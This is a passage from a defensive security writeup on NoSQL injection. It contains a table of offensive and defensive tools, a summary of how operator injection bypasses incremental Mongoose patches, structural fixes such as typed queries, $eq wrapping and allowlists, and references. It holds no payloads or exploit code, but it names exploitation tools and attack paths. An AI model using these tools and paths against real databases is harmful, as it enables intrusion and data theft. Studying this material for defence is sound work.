| **NoSQLMap** (offensive) | MongoDB, CouchDB, Cassandra | Automated operator injection and data dump; brute-force |
| **NoSQL-Exploitation-Framework** (offensive) | MongoDB, CouchDB, Redis, Cassandra | Modular exploitation; RCE, file retrieval, injection |
| **nosqli** (offensive) | MongoDB | Focused NoSQL injection scanner; boolean blind and operator |
| **Burp Suite** (offensive) | All (manual proxy) | Manual parameter manipulation; Content-Type switching; operator injection |
| **NodeXP** (offensive) | Node.js SSJI | Automated SSJI detection and exploitation with obfuscation |
| **SSJIgeddon** (offensive) | Node.js SSJI | Validates and exploits SSJI via Node.js eval/require paths |
| **plormber** (offensive) | Prisma/PostgreSQL | PoC time-based ORM injection for Prisma operator leaks |
| **mongo-sanitize** (defensive) | MongoDB/Node.js | Strips keys beginning with `$` from input objects |
| **express-mongo-sanitize** (defensive) | MongoDB/Express | Middleware: sanitizes `req.body`, `req.query`, `req.params` |
| **Mongoose sanitizeFilter: true** (defensive) | Mongoose ODM | Option introduced in 8.9.5; recursively strips operator keys |
| **Joi / Ajv / Zod** (defensive) | Any | Schema validation libraries; enforce type safety before DB call |
| **Invicti / Acunetix** (defensive) | MongoDB + others | DAST scanner with NoSQL injection detection |
| **Bright DAST** (defensive) | MongoDB, Redis | Developer-first DAST with NoSQL injection fuzzing in CI pipeline |
| **Datadog AppSec** (defensive) | Cassandra | CQL injection detection and alerting in runtime |

---

## Summary: Core Principles

**What fundamental property makes this entire mutation space possible?** NoSQL databases are defined by their rejection of a rigid, unified query model. Each database family exposes query logic as data structures — JSON objects, arrays, operator keys, JavaScript strings — rather than as a distinct, parsed grammar. This design decision, which enables the flexibility and schema-freedom that makes NoSQL appealing, also collapses the boundary between data and control. In a traditional SQL database, the grammar enforces a syntactic separation between user-supplied literals and query structure. In document stores, key-value caches, and graph databases, this separation is a convention that must be enforced by the application. When it is not — when a body parameter is deserialized into an object and passed directly to a database call — the attacker's input becomes structurally indistinguishable from developer-written query logic.

**Why do incremental patches fail?** The history of Mongoose CVE-2024-53900 and CVE-2025-23061 illustrates this precisely: the first patch stripped top-level `$where`, but the root cause — trusting the shape of user-supplied objects — was not addressed. The attacker moved the operator one level deeper and the protection broke. This pattern recurs across the ecosystem: `mongo-sanitize` strips first-level `$` keys but not deeply nested ones; Cassandra patches UDF sandboxing but the escape surface expands with each new Java version; Redis patches individual Lua CVEs but the EVAL attack surface remains. Each patch targets a specific payload path, not the structural trust violation. The correct fix is never to accept operator-laden objects from untrusted sources in the first place — which requires type enforcement, schema validation at the boundary, and explicit allowlisting of query fields and operators.

**What would a structural solution look like?** A structural defense operates at the query construction layer, not the sanitization layer. For document stores: use typed query builders that never accept raw `interface{}` or `any` input; wrap all user-supplied filter arguments in `$eq` to prevent operator substitution; and enable `sanitizeFilter: true` at the ODM level as a last-resort defense-in-depth measure. For protocol-level stores (Redis, Memcached): never concatenate user input into command strings; use typed client libraries that construct RESP frames programmatically. For graph databases (Neo4j): parameterize all literals, and recognize that labels, relationship types, and ORDER BY columns are not parameterizable — these must be validated against an explicit allowlist. For the ODM/ORM layer: treat the query object as a security boundary; never spread untrusted objects into the `where` clause regardless of database backend. The unifying principle is **query construction by construction**, not query sanitization by inspection.

---

## References

1. MongoDB Security Alerts — https://www.mongodb.com/resources/products/alerts
2. CVE-2025-14847 (MongoBleed) — https://www.mongodb.com/company/blog/news/mongodb-server-security-update-december-2025
3. CVE-2025-23061 (Mongoose $where incomplete fix) — https://nsfocusglobal.com/mongodb-mongoose-search-injection-vulnerability-cve-2025-23061/
4. CVE-2024-53900 (Mongoose $where initial) — GHSA-vg7j-7cwx-8wgw
5. CVE-2021-44521 (Apache Cassandra UDF RCE) — GHSA-8ffc-79xg-29w8
6. F5 Labs: "Why Critical MongoDB Library Flaws Won't See Mass Exploitation" — https://www.f5.com/labs/articles/why-critical-mongodb-library-flaws-wont-see-mass-exploitation
7. PayloadsAllTheThings — NoSQL Injection — https://swisskyrepo.github.io/PayloadsAllTheThings/NoSQL%20Injection/
8. HackTricks — NoSQL Injection — https://book.hacktricks.xyz/pentesting-web/nosql-injection
9. PortSwigger Web Security Academy — NoSQL Injection — https://portswigger.net/web-security/nosql-injection
10. Soroush Dalili — "MongoDB NoSQL Injection with Aggregation Pipelines" (2024) — https://soroush.me/blog/2024/06/mongodb-nosql-injection-with-aggregation-pipelines/
11. Van Landuyt, Wijshoff, Joosen — "A study of NoSQL query injection in Neo4j" — *Computers & Security*, Feb 2024 — https://dl.acm.org/doi/10.1016/j.cose.2023.103590
12. Neo4j Knowledge Base — "Protecting Against Cypher Injection" — https://neo4j.com/developer/kb/protecting-against-cypher-injection/
13. elttam — "plORMbing your Prisma ORM with Time-based Attacks" (2024) — https://www.elttam.com/blog/plorming-your-primsa-orm/
14. Aikido Security — "Prisma and PostgreSQL vulnerable to NoSQL injection" (2025) — https://www.aikido.dev/blog/prisma-and-postgresql-vulnerable-to-nosql-injection
15. SecOps Group — "A Pentester's Guide to NoSQL Injection" — https://secops.group/a-pentesters-guide-to-nosql-injection/
16. HackerOne Rocket.Chat reports: #1130721 (pre-auth blind), #1130874 (post-auth blind), #1757676 (listEmojiCustom)
17. HackTricks — Redis Pentesting (6379) — https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
18. WAFFLED (2025) — "Exploiting Parsing Discrepancies to Bypass Web Application Firewalls" — https://arxiv.org/html/2503.10846v1
19. Claroty Team82 — "{JS-ON: Security-OFF}: Abusing JSON-Based SQL to Bypass WAF" (2023) — https://claroty.com/team82/research/js-on-security-off-abusing-json-based-sql-to-bypass-waf
20. PayloadsAllTheThings — Cassandra Injection — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Cassandra%20Injection.md
21. NodeXP: NOde.js SSJI DEtection and eXPloitation — *Journal of Systems and Software*, 2021 — https://www.sciencedirect.com/science/article/abs/pii/S221421262100003X
22. INCIBE-CERT — "NoSQL Injection: How malicious input can compromise your application" — https://www.incibe.es/en/incibe-cert/blog/nosql-injection-how-malicious-input-can-compromise-your-application
23. Jorianwoltjer — NoSQL Injection (Practical CTF) — https://book.jorianwoltjer.com/web/server-side/nosql-injection

---

*This document was created for defensive security research and vulnerability understanding purposes.*
